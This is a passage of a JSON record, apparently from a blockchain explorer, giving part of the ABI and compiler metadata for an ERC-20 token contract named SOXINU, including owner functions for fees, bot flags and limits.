"}],\"name\":\"rescueERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_distributor\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_staking\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"}],\"name\":\"setDivisors\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setExemptAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_alpha\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_beta\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_delta\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_stake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_default\",\"type\":\"address\"}],\"name\":\"setInternalAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_transaction\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_wallet\",\"type\":\"uint256\"}],\"name\":\"setMaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setPairReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liq\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_mark\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_stak\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_tran\",\"type\":\"uint256\"}],\"name\":\"setStructure\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_threshold\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_bool\",\"type\":\"bool\"}],\"name\":\"setbotOn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_bool\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setisBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_bool\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setisInternal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_input\",\"type\":\"uint256\"}],\"name\":\"setstartSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"syncContractPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"unauthorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"viewisBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SOXINU", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f3c7e01de0d3a10c9f22a1c18e73e15f98a436d8ea6854e818626640c5699e3b"}]}